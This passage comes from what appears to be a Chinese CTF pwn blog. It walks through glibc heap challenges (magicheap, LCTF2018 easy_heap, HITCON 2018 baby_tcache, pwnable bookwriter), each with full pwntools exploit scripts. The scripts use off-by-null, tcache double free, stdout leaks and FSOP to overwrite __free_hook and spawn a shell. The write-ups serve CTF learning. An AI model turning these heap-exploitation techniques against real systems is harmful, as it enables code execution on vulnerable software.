class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="LCTF2018-PWN-easy-heap"><a href="#LCTF2018-PWN-easy-heap" class="headerlink" title="LCTF2018 PWN easy_heap"></a>LCTF2018 PWN easy_heap</h2><p><strong>难度:★★★</strong></p><p>保护全开</p><p>难度有一部分是来与堆tcache的不熟悉,以及其综合运用了unosrtedbin的许多相关利用点,主要还是太久没学,对堆的知识有些生分了</p><p> 学习的第一道带tcache bin的堆题,借此巩固自己堆tchche的学习</p><p>程序在自己实现的读入函数中存在off-by-null的漏洞</p><p>最多可以添加10个chunk</p><p>如果释放chunk那么前7个是会进入tcache的</p><p>利用的主要点自然是off-by-null,达到overlapping或extended的效果</p><p>但由于tcache以及本题固定大小chunk的影响显然不能直接利用</p><p>于是在凑满tcache后,再释放三个相临的chunk(命名为A,B,C)使之合并,这样c的prev_size段就被写为了0x200,</p><p>只要put null在其inuse位再释放就可以将之前的chunk包括进来,如果此时ab有处于使用状态的,则可以借机达到double free的效果</p><p>之后修改__free_hook为onegadget或者system之类皆可</p><p>另外因为本题无修改功能,因此只能重新分配改写字段</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./eh&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(content) &gt;= size:</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.sendline(content)</span><br><span class="line">          </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">return</span> p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一步，构造堆大致布局,哪些chunk进入tcahce那些进入unsorted十分重要</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;abcd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i)</span><br><span class="line">   </span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#防止unsorted与top合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">delete(i)</span><br><span class="line">   </span><br><span class="line"><span class="comment">#其实微微调整其他类似布局也是可以的</span></span><br><span class="line"><span class="comment">#此时三个unsorted已经合并完成，并且末尾的unosrted的prev_size已被修改为0x200</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二步，开始利用off-by-null</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)<span class="comment">#into tcache</span></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#into unsorted</span></span><br><span class="line">new(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#get prev-8 which changed to 0 and put null in next&#x27;s prev_size fields</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#trigger </span></span><br><span class="line"><span class="comment">#这几个顺序很重要</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#get prev-7 and incise the big chunk made 0&#x27;s fd,bk writed</span></span><br><span class="line">libc_leak = u64(show(<span class="number">0</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">libc.address = libc_leak - <span class="number">0x3ebca0</span> <span class="comment">#get from gdb</span></span><br><span class="line"><span class="comment"># assign libc.address could admit us not to plus libc_base</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line"><span class="comment">#上面两个操作说是绕过检测，即因为之后会取出三次，则counts必然要符合条件，则至少要释放三次，因此上面的操作去掉一个也是可以的</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment"># 0 amd 9 point to the same chunk</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#double free made point to itself</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># 0 lifo find chunk by fd</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;win&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f302</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0xb-0xc</strong></p><p>顺便学了个新技巧,libc.address在赋值为libcbase后,再得到的地址就已经自动加上了libcbase,不用另外自己加</p><p>其实有tcache的思路与无大差不差,只是存在一个优先级十分高的tcache,影响思路的具体执行</p><h2 id="HITCON-2018-PWN-baby-tcache"><a href="#HITCON-2018-PWN-baby-tcache" class="headerlink" title="HITCON 2018 PWN baby_tcache"></a>HITCON 2018 PWN baby_tcache</h2><p><strong>难度:★★★★</strong></p><p>保护全开</p><p>程序十分简单只有两个功能,malloc与free,不过程序越简单不代表越好,因为没有show函数,要想泄露信息变得难上加难</p><p>程序自带一个可能的off-by-null</p><p>wiki提供了两种思路,第一种需要爆破,第二种利用了io_file的知识,选择第二种</p><p>_IO_2_1_stdout等结构体位于libc段中,main_arena也位于libc段中,那么他们就有固定的偏移,并且这个偏移量并不太大,依此可以部分写达到目的,</p><p>_IO_2_1_stdout和main_arena除了后12位皆相等,不过我们只能写16位,这也就意味着exp只有十六分之一的成功率</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;./bt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size,data=<span class="string">b&#x27;abc&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">new(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>)<span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x4f8</span>)<span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>)<span class="comment">#6 avoid consolidate with top</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">b&#x27;\x60\x06&#x27;</span>)  <span class="comment">#4  put null in 5</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#into tcache，切割后fd和bk写入unsorted</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#写fd????</span></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment">#unsorted and trigger consolidate 0 1 2 3 4 </span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x530</span>) <span class="comment">#使2的fd变为unsorted  idx-&gt;0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)<span class="comment"># into tcache </span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">0xa8</span>, <span class="string">b&#x27;\x60\x27&#x27;</span>)<span class="comment">#2760覆写2的fd部分,碰撞低地址16位,成功概率十六分之一</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x40</span>)<span class="comment">#取出 2-&gt;idx 4</span></span><br><span class="line">new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#把stdout取出来了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(p.recv(<span class="number">8</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak!!!!!!!!!&quot;</span>)</span><br><span class="line">info1 = p.recv(<span class="number">8</span>)<span class="comment">#观测得知这里是我们要的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(info1))</span><br><span class="line">libc.address = u64(info1) - <span class="number">0x3ed8b0</span></span><br><span class="line">log.info(<span class="string">&quot;libc @ &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0xa8</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#4 的fd</span></span><br><span class="line">new(<span class="number">0x60</span>)<span class="comment">#取出4-&gt;idx 6</span></span><br><span class="line">new(<span class="number">0x60</span>, p64(libc.address + <span class="number">0x4f302</span>)) <span class="comment"># one gadget with $rsp+0x40 = NULL再取出freehook-fakechunk</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#trigger</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>挺难的,结合了io_file的知识</p><h2 id="pwnable-bookwriter"><a href="#pwnable-bookwriter" class="headerlink" title="pwnable_bookwriter"></a>pwnable_bookwriter</h2><p><strong>难度:★★★</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bw&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc是2.23</p><p>主要漏洞点:</p><ol><li>根据内存判断应该只能存储8个book,但是add函数判断时是if(a&gt;8)结合函数功能会将一个book的size覆写为一个地址(一个很大的数值)</li><li>edit函数后会将book的size根据新输入的字符串调整,如果和下一个chunk的size连接起来就可以多写一个字节到下一个chunk</li><li>author长度为0x40时,可以向下继续泄露地址</li></ol><p>利用核心:</p><ol><li>这题没有free功能,要想泄露libc就要对topchunk动手脚(本体可以修改其大小,再申请一个比修改后的size大的大小,使topchunk加入unsortedbin)</li><li>具体的漏洞利用实现要用到FSOP</li></ol><p>实现过程:</p><ol><li>泄露heap</li><li>通过topchunk进入unsortedbin泄露libc</li><li>第0个chunk大数字写伪造io_file和vtable</li><li>申请chunk利用unsortedbin attack写IO_file并让fake_iofile加入到smallbin链并成功进入fake_io_list_all,并因为unsortedbin链损坏触发malloc_printer以此getshell</li></ol><p>触发trigger(将IO_list_all-0x10视为chunk起始的话,size==0)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p><strong>exp:</strong>(有小概率失败,可能是aslr的影响)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./bw&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;page :&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)  <span class="comment">#top chunk size edit</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#add top chunk to unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;heap: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;_IO_list_all: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> +<span class="number">0xe0</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span 